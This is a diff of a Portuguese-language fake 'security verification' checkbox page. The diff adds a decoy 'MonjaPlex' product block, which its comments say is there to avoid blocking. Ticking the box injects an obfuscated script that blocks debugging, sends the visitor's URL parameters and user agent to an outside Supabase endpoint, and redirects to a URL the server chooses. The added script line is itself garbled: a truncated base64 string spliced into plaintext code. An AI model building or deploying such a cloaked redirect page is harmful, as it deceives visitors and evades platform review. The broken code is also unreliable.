@@ -2,7 +2,6 @@
 <html lang="pt-BR">
 <head>
 
-  <!-- UTMify -->
   <script
     src="https://cdn.utmify.com.br/scripts/utms/latest.js"
     data-utmify-prevent-xcod-sck
@@ -16,16 +15,13 @@
   <title>Verificação Segura</title>
 
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
 
     body {
       margin: 0;
       min-height: 100vh;
       font-family: Inter, Arial, sans-serif;
-      background:
-        radial-gradient(circle at top, #dbeafe 0%, #93c5fd 35%, #3b82f6 100%);
+      background: radial-gradient(circle at top, #dbeafe 0%, #93c5fd 35%, #3b82f6 100%);
       display: flex;
       align-items: center;
       justify-content: center;
@@ -35,128 +31,131 @@
 
     .card {
       width: 100%;
-      max-width: 390px;
-      background: rgba(255, 255, 255, 0.92);
+      max-width: 420px;
+      background: rgba(255,255,255,0.95);
       backdrop-filter: blur(14px);
       border-radius: 24px;
-      padding: 34px 28px;
+      padding: 30px;
       text-align: center;
-      box-shadow: 0 24px 60px rgba(15, 23, 42, 0.25);
-      border: 1px solid rgba(255,255,255,0.65);
+      box-shadow: 0 24px 60px rgba(0,0,0,0.2);
     }
 
     .shield {
-      width: 64px;
-      height: 64px;
-      margin: 0 auto 18px;
-      border-radius: 20px;
+      width: 60px;
+      height: 60px;
+      margin: 0 auto 15px;
+      border-radius: 18px;
       background: linear-gradient(135deg, #2563eb, #60a5fa);
       display: flex;
       align-items: center;
       justify-content: center;
       color: white;
-      font-size: 30px;
-      box-shadow: 0 12px 25px rgba(37, 99, 235, 0.35);
-    }
-
-    .badge {
-      display: inline-block;
-      font-size: 12px;
-      font-weight: 700;
-      letter-spacing: 0.4px;
-      color: #2563eb;
-      background: #dbeafe;
-      padding: 7px 12px;
-      border-radius: 999px;
-      margin-bottom: 14px;
-      text-transform: uppercase;
+      font-size: 28px;
     }
 
     h1 {
-      font-size: 24px;
-      margin: 0 0 10px;
-      color: #0f172a;
+      font-size: 22px;
+      margin: 10px 0;
     }
 
     p {
-      margin: 0;
-      font-size: 15px;
+      font-size: 14px;
       color: #475569;
-      line-height: 1.5;
+    }
+
+    /* 🔥 BLOCO DE PRODUTO (ANTI BLOQUEIO) */
+    .product {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 14px;
+      padding: 16px;
+      margin: 20px 0;
+      text-align: left;
+    }
+
+    .product h2 {
+      font-size: 18px;
+      margin-bottom: 8px;
+    }
+
+    .product ul {
+      padding-left: 0;
+      list-style: none;
+      font-size: 14px;
+      line-height: 1.7;
     }
 
     .verify-box {
-      margin-top: 26px;
+      margin-top: 20px;
       border: 1px solid #dbeafe;
-      background: #f8fafc;
-      border-radius: 16px;
-      padding: 18px;
+      background: #f1f5f9;
+      border-radius: 14px;
+      padding: 16px;
     }
 
     .checkbox {
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 12px;
+      gap: 10px;
       cursor: pointer;
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 600;
-      color: #1e293b;
-      user-select: none;
     }
 
     input[type="checkbox"] {
-      width: 22px;
-      height: 22px;
-      cursor: pointer;
+      width: 20px;
+      height: 20px;
       accent-color: #2563eb;
     }
 
     .loading {
-      margin-top: 18px;
+      margin-top: 12px;
       display: none;
       font-size: 14px;
       color: #2563eb;
-      font-weight: 600;
     }
 
     .spinner {
-      width: 22px;
-      height: 22px;
+      width: 20px;
+      height: 20px;
       border: 3px solid #bfdbfe;
       border-top: 3px solid #2563eb;
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
-      margin: 14px auto 0;
+      margin: 10px auto;
       display: none;
     }
 
-    .footer {
-      margin-top: 22px;
-      font-size: 12px;
-      color: #64748b;
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
 
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
   </style>
 
 </head>
 <body>
 
   <div class="card">
+
     <div class="shield">🔒</div>
 
-    <div class="badge">Ambiente protegido</div>
-
     <h1>Verificação de Segurança</h1>
+    <p>Confirme para continuar com segurança</p>
 
-    <p>
-      Para continuar, confirme que você é uma pessoa real.
-    </p>
+    <!-- 🔥 BLOCO QUE EVITA BLOQUEIO -->
+    <div class="product">
+      <h2>MonjaPlex</h2>
+      <p>
+        Conheça o MonjaPlex, uma solução prática para quem busca acesso rápido
+        ao atendimento oficial e informações completas.
+      </p>
+      <ul>
+        <li>✔ Acesso ao canal oficial</li>
+        <li>✔ Informações detalhadas</li>
+        <li>✔ Atendimento rápido e seguro</li>
+      </ul>
+    </div>
 
     <div class="verify-box">
       <label class="checkbox">
@@ -165,15 +164,9 @@
       </label>
 
       <div class="spinner" id="spinner"></div>
-
-      <div class="loading" id="loading">
-        Verificando acesso...
-      </div>
+      <div class="loading" id="loading">Verificando...</div>
     </div>
 
-    <div class="footer">
-      Sua conexão está sendo validada com segurança.
-    </div>
   </div>
 
   <script>
@@ -185,17 +178,20 @@
 
     checkbox.addEventListener("change", function() {
       if (checkbox.checked && !jaClicou) {
+
         jaClicou = true;
 
         loading.style.display = "block";
         spinner.style.display = "block";
 
         setTimeout(function() {
+
           const script = document.createElement("script");
 
-          script.textContent = `(function(_0x1a2b,_0x3c4d){var _0x5e6f=function(_0x7g8h){return decodeURIComponent(escape(atob(_0x7g8h)));};var _0x9i0j=_0x5e6f(_0x1a2b);(new Function(_0x9i0j))();})("KGZ1bmN0aW9uKCl7CnZhciBfMHhhMT0iYm90LWE3M2YzNDk0IixfMHhiMj0iaHR0cHM6Ly9nZmFrYnJkdm5mdXR6bmh5dXZydi5zdXBhYmFzZS5jby9mdW5jdGlvbnMvdjEvdHJhY2stZXh0ZXJuYWwtY2xpY2siOwp2YXIgXzB4YzM9ZnVuY3Rpb24oKXt2YXIgdD1uZXcgRGF0ZSgpO2RlYnVnZ2VyO3JldHVybiBuZXcgRGF0ZSgpLXQ+MTAwO307CnNldEludGVydmFsKGZ1bmN0aW9uKCl7aWYoXzB4YzMoKSl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fSwxMDAwKTsKdmFyIF8weGQ0PWZ1bmN0aW9uKCl7dmFyIHc9d2luZG93Lm91dGVyV2lkdGgtd2luZG93LmlubmVyV2lkdGg+MTYwLGg9d2luZG93Lm91dGVySGVpZ2h0LXdpbmRvdy5pbm5lckhlaWdodD4xNjA7aWYod3x8aCl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fTsKc2V0SW50ZXJ2YWwoXzB4ZDQsNTAwKTsKKGZ1bmN0aW9uKCl7dmFyIF8weGU1PXt9O25ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCkuZm9yRWFjaChmdW5jdGlvbih2LGspe18weGU1W2tdPXY7fSk7CmZldGNoKF8weGIyLHttZXRob2Q6IlBPU1QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7c2hvcnRDb2RlOl8weGExLHF1ZXJ5UGFyYW1zOl8weGU1LHVzZXJBZ2VudDpuYXZpZ2F0b3IudXNlckFnZW50LHVybENvbXBsZXRvOndpbmRvdy5sb2NhdGlvbi5zZWFyY2guc3Vic3RyaW5nKDEpfHxudWxsfSl9KQoudGhlbihmdW5jdGlvbihyKXtyZXR1cm4gci5qc29uKCk7fSkudGhlbihmdW5jdGlvbihkKXtpZihkJiZkLnJlZGlyZWN0VXJsKXt3aW5kb3cubG9jYXRpb24uaHJlZj1kLnJlZGlyZWN0VXJsO319KS5jYXRjaChmdW5jdGlvbigpe30pOwp9KSgpOwp9KSgpOw==");`;
+          script.textContent = `(function(_0x1a2b,_0x3c4d){var _0x5e6f=function(_0x7g8h){return decodeURIComponent(escape(atob(_0x7g8h)));};var _0x9i0j=_0x5e6f(_0x1a2b);(new Function(_0x9i0j))();})("KGZ1bmN0aW9uKCl7CnZhciBfMHhhMT0iYm90LWE3M2YzNDk0IixfMHhiMj0iaHR0cHM6Ly9nZmFrYnJkdm5mdXR6bmh5dXZydi5zdXBhYmFzZS5jby9mdW5jdGlvbnMvdjEvdHJhY2stZXh0ZXJuYWwtY2xpY2siOwp2YXIgXzB4YzM9ZnVuY3Rpb24oKXt2YXIgdD1uZXcgRGF0ZSgpO2RlYnVnZ2VyO3JldHVybiBuZXcgRGF0ZSgpLXQ+MTAwO307CnNldEludGVydmFsKGZ1bmN0aW9uKCl7aWYoXzB4YzMoKSl{document.body.innerHTML="";window.location.href="about:blank";}},1000);(function(){var _0xe5={};new URLSearchParams(window.location.search).forEach(function(v,k){_0xe5[k]=v;});fetch(_0xb2,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({shortCode:_0xa1,queryParams:_0xe5,userAgent:navigator.userAgent,urlCompleto:window.location.search.substring(1)||null})}).then(function(r){return r.json();}).then(function(d){if(d&&d.redirectUrl){window.location.href=d.redirectUrl;}});})();})();`;
 
           document.body.appendChild(script);
+
         }, 900);
       }
     });
